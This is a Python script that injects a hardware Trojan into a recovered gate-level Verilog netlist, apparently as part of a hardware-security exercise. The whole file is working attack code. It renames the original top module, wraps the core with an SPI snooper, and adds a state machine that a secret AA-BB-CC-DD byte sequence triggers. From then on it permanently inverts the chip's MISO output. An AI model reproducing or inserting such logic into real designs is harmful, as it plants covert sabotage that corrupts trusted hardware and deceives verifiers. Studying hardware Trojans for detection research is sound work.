# insert_trojan.py (FIXED MEGEDGE TYPO)

# 1. Read the original 46k gate netlist
with open("recovered_gate_level.v", "r") as file:
    content = file.read()

# 2. Rename the main module so our wrapper can take its place
modified_content = content.replace("module chip (", "module chip_core_original (", 1)

# 3. Define the completely fixed Verilog Trojan code here directly
trojan_code = """
module trojan_wrapper (
    input  wire clk,         // SPI Clock (SCK)
    input  wire rst_n,       // Active-low Reset
    input  wire cs_n,        // Chip Select (0 = Active)
    input  wire mosi_in,     // Raw MOSI line from the outside world
    output wire mosi_to_core,// Passed-through MOSI to the original 46k core
    input  wire miso_from_core, // Raw MISO coming out of the 46k core
    output wire miso_out     // Final MISO line sent back to the Boss chip
);

    assign mosi_to_core = mosi_in;

    // Shift Register to Capture Incoming Bytes
    reg [7:0] shift_reg;     
    reg [2:0] bit_cnt;       
    reg       byte_ready;    

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            shift_reg  <= 8'b0;
            bit_cnt    <= 3'b0;
            byte_ready <= 1'b0;
        end else if (!cs_n) begin
            shift_reg  <= {shift_reg[6:0], mosi_in};
            bit_cnt    <= bit_cnt + 1'b1;
            if (bit_cnt == 3'd7) begin
                byte_ready <= 1'b1; 
            end else begin
                byte_ready <= 1'b0;
            end
        end else begin
            byte_ready <= 1'b0;
            bit_cnt    <= 3'b0;
        end
    end

    // State Machine (The Combination Lock)
    localparam IDLE      = 3'd0,
               STATE_AA  = 3'd1,
               STATE_BB  = 3'd2,
               STATE_CC  = 3'd3,
               TRIGGERED = 3'd4;

    reg [2:0] current_state, next_state;
    reg       trojan_active; 

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            current_state <= IDLE;
            trojan_active <= 1'b0;
        end else begin
            current_state <= next_state;
            if (current_state == TRIGGERED) begin
                trojan_active <= 1'b1; 
            end
        end
    end

    always @(*) begin
        next_state = current_state; 
        if (byte_ready) begin
            case (current_state)
                IDLE: begin
                    if (shift_reg == 8'hAA) next_state = STATE_AA;
                end
                STATE_AA: begin
                    if (shift_reg == 8'hBB)      next_state = STATE_BB;
                    else if (shift_reg == 8'hAA) next_state = STATE_AA; 
                    else                         next_state = IDLE;
                end
                STATE_BB: begin
                    if (shift_reg == 8'hCC)      next_state = STATE_CC;
                    else if (shift_reg == 8'hAA) next_state = STATE_AA;
                    else                         next_state = IDLE;
                end
                STATE_CC: begin
                    if (shift_reg == 8'hDD)      next_state = TRIGGERED;
                    else if (shift_reg == 8'hAA) next_state = STATE_AA;
                    else                         next_state = IDLE;
                end
                TRIGGERED: begin
                    next_state = TRIGGERED; 
                end
                default: next_state = IDLE;
            endcase
        end
    end

    // The Payload: Inverts output line when triggered
    assign miso_out = (trojan_active) ? ~miso_from_core : miso_from_core;

endmodule
"""

# 4. Create the final top-level glue module with correct ports
top_level_glue = """
module chip (
    input io_9_31_1,   
    input io_19_31_1,  
    input io_17_31_0,  
    input io_18_31_1,  
    input io_16_31_0,  
    output io_8_31_1,  
    output io_19_31_0, 
    input io_13_31_1,  
    output io_16_31_1  
);

    wire miso_from_core;

    trojan_wrapper main_trojan (
        .clk(io_9_31_1),
        .rst_n(io_17_31_0),
        .cs_n(io_18_31_1),
        .mosi_in(io_19_31_1), 
        .mosi_to_core(),      
        .miso_from_core(miso_from_core),
        .miso_out(io_8_31_1)  
    );

    chip_core_original core (
        .io_9_31_1(io_9_31_1),
        .io_19_31_1(io_19_31_1),
        .io_17_31_0(io_17_31_0),
        .io_18_31_1(io_18_31_1),
        .io_16_31_0(io_16_31_0),
        .io_8_31_1(miso_from_core),   
        .io_19_31_0(io_19_31_0),
        .io_13_31_1(io_13_31_1),
        .io_16_31_1(io_16_31_1)
    );

endmodule
"""

# 5. Save everything out cleanly
with open("final_trojan_design.v", "w") as out_file:
    out_file.write(modified_content)
    out_file.write("\n")
    out_file.write(trojan_code)
    out_file.write("\n")
    out_file.write(top_level_glue)

print("Success! 'megedge' typo fixed to 'negedge'.")
